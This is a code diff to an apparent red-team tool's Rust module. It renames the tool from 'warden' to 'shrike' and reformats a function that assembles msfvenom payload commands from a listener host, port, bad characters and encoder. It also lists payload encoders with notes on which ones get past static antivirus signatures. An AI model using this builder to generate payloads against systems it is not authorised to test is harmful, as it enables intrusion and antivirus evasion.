@@ -1,4 +1,4 @@
-//! msfvenom command builder. warden doesn't embed Metasploit — it constructs the
+//! msfvenom command builder. shrike doesn't embed Metasploit — it constructs the
 //! exact `msfvenom` invocation for the operator to run, plus the matching handler.
 
 #[derive(Debug, Clone)]
@@ -64,7 +64,14 @@ pub fn by_id(id: &str) -> Option<&'static MsfSpec> {
 
 impl MsfSpec {
     /// Build the msfvenom command line. `badchars` may be empty.
-    pub fn command(&self, lhost: &str, lport: &str, badchars: &str, encoder: Option<&str>, iters: u32) -> String {
+    pub fn command(
+        &self,
+        lhost: &str,
+        lport: &str,
+        badchars: &str,
+        encoder: Option<&str>,
+        iters: u32,
+    ) -> String {
         let mut c = format!("msfvenom -p {} LHOST={lhost} LPORT={lport}", self.payload);
         if self.payload.contains("windows") {
             c.push_str(" EXITFUNC=thread");
@@ -99,7 +106,10 @@ impl MsfSpec {
 
 /// Encoders worth offering, with an honest note on effectiveness.
 pub const ENCODERS: &[(&str, &str)] = &[
-    ("x86/shikata_ga_nai", "polymorphic XOR; defeats static signatures, NOT behavioural AV"),
+    (
+        "x86/shikata_ga_nai",
+        "polymorphic XOR; defeats static signatures, NOT behavioural AV",
+    ),
     ("x64/xor_dynamic", "x64 dynamic XOR"),
     ("cmd/powershell_base64", "base64 a cmd payload"),
 ];
